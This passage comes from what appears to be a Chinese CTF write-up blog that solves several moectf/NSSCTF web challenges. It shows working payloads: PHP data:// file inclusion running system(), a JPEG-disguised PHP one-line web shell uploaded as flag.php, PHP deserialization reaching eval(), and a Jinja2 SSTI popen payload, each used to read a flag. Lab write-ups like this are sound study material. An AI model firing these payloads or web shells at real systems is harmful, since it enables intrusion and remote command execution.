<td><code>expect://</code></td>
<td>执行系统命令（极少见）</td>
</tr>
</tbody></table>
<p>payload1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ls -la /&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;] . &quot;.php&quot;); total 68 drwxr-xr-x 1 root root 4096 Sep 4 00:52 . drwxr-xr-x 1 root root 4096 Sep 4 00:52 .. lrwxrwxrwx 1 root root 7 May 12 19:25 bin -&gt; usr/bin drwxr-xr-x 2 root root 4096 May 12 19:25 boot drwxr-xr-x 5 root root 360 Sep 4 00:52 dev -rwxr-xr-x 1 root root 118 Aug 20 12:43 entrypoint.sh drwxr-xr-x 1 root root 4096 Sep 4 00:52 etc -rw-r--r-- 1 root root 45 Sep 4 00:52 flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt drwxr-xr-x 2 root root 4096 May 12 19:25 home lrwxrwxrwx 1 root root 7 May 12 19:25 lib -&gt; usr/lib lrwxrwxrwx 1 root root 9 May 12 19:25 lib64 -&gt; usr/lib64 drwxr-xr-x 2 root root 4096 Aug 11 00:00 media drwxr-xr-x 2 root root 4096 Aug 11 00:00 mnt drwxr-xr-x 2 root root 4096 Aug 11 00:00 opt dr-xr-xr-x 441 root root 0 Sep 4 00:52 proc drwx------ 2 root root 4096 Aug 11 00:00 root drwxr-xr-x 1 root root 4096 Sep 4 00:52 run lrwxrwxrwx 1 root root 8 May 12 19:25 sbin -&gt; usr/sbin drwxr-xr-x 2 root root 4096 Aug 11 00:00 srv dr-xr-xr-x 13 root root 0 Aug 18 11:39 sys drwxrwxrwt 1 root root 4096 Sep 4 00:52 tmp drwxr-xr-x 1 root root 4096 Aug 11 00:00 usr drwxr-xr-x 1 root root 4096 Aug 12 22:26 var .php</span><br></pre></td></tr></table></figure>

<p>看到flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;cat /flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="第四章-金曦破禁与七绝傀儡阵"><a href="#第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="第四章 金曦破禁与七绝傀儡阵"></a>第四章 金曦破禁与七绝傀儡阵</h3><p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.0.png" alt="1"></p>
<p>抓包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /stone_golem HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>使用GET方法传递参数 key&#x3D;xdsec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /stone_golem?key=xdsec HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag1:bW9lY3Rme0Mw</span><br><span class="line">&lt;a href=&quot;/cloud_weaver&quot;&gt;前往第二关：织云傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.1.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cloud_weaver HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">declaration=%E7%BB%87%E4%BA%91%E9%98%81%3D%E7%AC%AC%E4%B8%80</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag2: bjZyNDd1MTQ3  </span><br><span class="line"> &lt;a href=&quot;/shadow_stalker&quot;&gt;前往第三关：溯源傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.2.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /shadow_stalker HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">X-Forwarded-For:127.0.0.1  </span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag3:MTBuNV95MHVy</span><br><span class="line">&lt;a href=&quot;/soul_discerner&quot;&gt;前往第四关：器灵傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.3.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /soul_discerner HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: moe browser  </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag4:X2g3N1BfbDN2</span><br><span class="line">&lt;a href=&quot;/heart_seal&quot;&gt;前往第五关：心印傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.4.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /heart_seal HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: user=xt; role=xt; auth=1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag5:M2xfMTVfcjM0</span><br><span class="line">&lt;a href=&quot;/pathfinder&quot;&gt;前往第六关：前尘傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.5.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /pathfinder HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Referer: http://panshi/entry</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag6:bGx5X2gxOWgh</span><br><span class="line">&lt;a href=&quot;/void_rebirth&quot;&gt;前往第七关：逆转傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">玉板铭文：阴阳逆乱，归墟可填。以&quot;覆&quot;代&quot;取&quot;，塑吾新生</span><br><span class="line"></span><br><span class="line">使用PUT方法，请求体为&quot;新生！&quot;</span><br><span class="line"></span><br><span class="line"> 请使用工具发送PUT请求</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_put_request_and_save():</span><br><span class="line">    url = &quot;http://127.0.0.1:56205/void_rebirth&quot;</span><br><span class="line">    data = &quot;新生！&quot;</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Host&quot;: &quot;127.0.0.1:56205&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36&quot;,</span><br><span class="line">        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">        &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;text/plain; charset=utf-8&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        response = requests.put(url, data=data.encode(&#x27;utf-8&#x27;), headers=headers)</span><br><span class="line">        print(f&quot;状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 保存响应到文件</span><br><span class="line">        with open(&quot;response.html&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">            f.write(response.text)</span><br><span class="line">        print(&quot;响应已保存到 response.html 文件中&quot;)</span><br><span class="line"></span><br><span class="line">        # 检查是否包含成功关键词</span><br><span class="line">        if &quot;成功&quot; in response.text or &quot;通过&quot; in response.text:</span><br><span class="line">            print(&quot;✓ 恭喜！挑战成功！&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;响应内容已保存，请查看文件确认结果&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;请求出错: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    send_put_request_and_save()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fQ==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bW9lY3Rme0MwbjZyNDd1MTQ3 MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">moectf&#123;C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!&#125;</span><br></pre></td></tr></table></figure>



<h3 id="第十三章-通幽关·灵纹诡影"><a href="#第十三章-通幽关·灵纹诡影" class="headerlink" title="第十三章 通幽关·灵纹诡影"></a>第十三章 通幽关·灵纹诡影</h3><p>文件上传的题目</p>
<ul>
<li>仅受仙灵之气浸润的「云纹图」可修复玉魄核心（建议扩展名：.jpg）</li>
<li>灵纹尺寸不得大于三寸（30000字节）</li>
<li>灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）</li>
<li>违禁灵纹将触发九幽雷劫，魂飞魄散！</li>
</ul>
<p>要求头部是FFD8FF，扩展名：.jpg</p>
<p>脚本生成一句话木马</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成flag.jpg文件，头部为FFD8FF，后面接指定PHP代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_flag_jpg</span>(<span class="params">filename=<span class="string">&quot;flag.jpg&quot;</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># JPEG文件头部字节: FFD8FF</span></span><br><span class="line">        jpg_header = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;FFD8FF&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 要添加的PHP代码</span></span><br><span class="line">        php_code = <span class="string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将PHP代码转换为字节</span></span><br><span class="line">        php_bytes = php_code.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 合并头部和PHP代码</span></span><br><span class="line">        file_content = jpg_header + php_bytes</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 写入文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(file_content)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;filename&#125;</span> 生成成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件大小: <span class="subst">&#123;<span class="built_in">len</span>(file_content)&#125;</span> 字节&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;生成文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_flag_jpg()</span><br></pre></td></tr></table></figure>

<p>然后抓包，再send,有点要注意就是FFD8FF要在HEX里改一下，然后flag.jpg改成php再上传。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:56088</span><br><span class="line">Content-Length: 224</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1:56088</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynIFBmbukzvUMjAFA</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1:56088/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarynIFBmbukzvUMjAFA</span><br><span class="line">Content-Disposition: form-data; name=&quot;spiritPattern&quot;; filename=&quot;flag.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">ÿØÿ&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarynIFBmbukzvUMjAFA--</span><br></pre></td></tr></table></figure>

<p>最后用蚁剑连接一下后门就可以得到flag了。</p>
<h3 id="第十七章-星骸迷阵·神念重构"><a href="#第十七章-星骸迷阵·神念重构" class="headerlink" title="第十七章 星骸迷阵·神念重构"></a>第十七章 星骸迷阵·神念重构</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ol>
<li>应用接受用户输入的GET参数<code>a</code></li>
<li>直接对输入进行反序列化操作，没有进行任何过滤或验证</li>
<li>类A的<code>__destruct</code>方法中使用<code>eval()</code>执行类属性<code>$a</code>的内容</li>
<li>当对象被销毁时，会自动调用<code>__destruct</code>方法</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>; <span class="comment">// 使用system执行ls命令</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$serialized</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL编码后的序列化字符串:</span><br><span class="line">O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D</span><br><span class="line"></span><br><span class="line">原始序列化字符串:</span><br><span class="line">O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:15:&quot;system(&#x27;ls /&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:58283/index.php/?a=O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; app bin dev entrypoint.sh etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>

<p>看到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$serialized</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:58283/index.php/?a=O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>发送即可获得flag</p>
<h3 id="ez-SSTI"><a href="#ez-SSTI" class="headerlink" title="ez_SSTI"></a>ez_SSTI</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你的名字是？(use ?name= in url)</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28531/ssti?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欢迎 49</span><br><span class="line">你已经掌握ssti的精髓了，开始读取flag吧！！🫡</span><br><span class="line">提示模板是Jinja2，参考文章https://www.cnblogs.com/hetianlab/p/17273687.html🤪</span><br><span class="line">推荐工具fenjing，可上网下载，也可进群咨询😉</span><br></pre></td></tr></table></figure>

<p>paylaod1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28531/ssti?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欢迎 NSSCTF&#123;6e72997c-2192-4ec3-98a1-3404123b90cd&#125;</span><br><span class="line">你已经掌握ssti的精髓了，开始读取flag吧！！🫡</span><br><span class="line">提示模板是Jinja2，参考文章https://www.cnblogs.com/hetianlab/p/17273687.html🤪</span><br><span class="line">推荐工具fenjing，可上网下载，也可进群咨询😉</span><br></pre></td></tr></table></figure>

<h3 id="第二十章-幽冥血海·幻语心魔"><a href="#第二十章-幽冥血海·幻语心魔" class="headerlink" title="第二十章 幽冥血海·幻语心魔"></a>第二十章 幽冥血海·幻语心魔</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment"># ... 此处存在SSTI漏洞</span></span><br><span class="line">        login_msg = render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;login-result&quot; 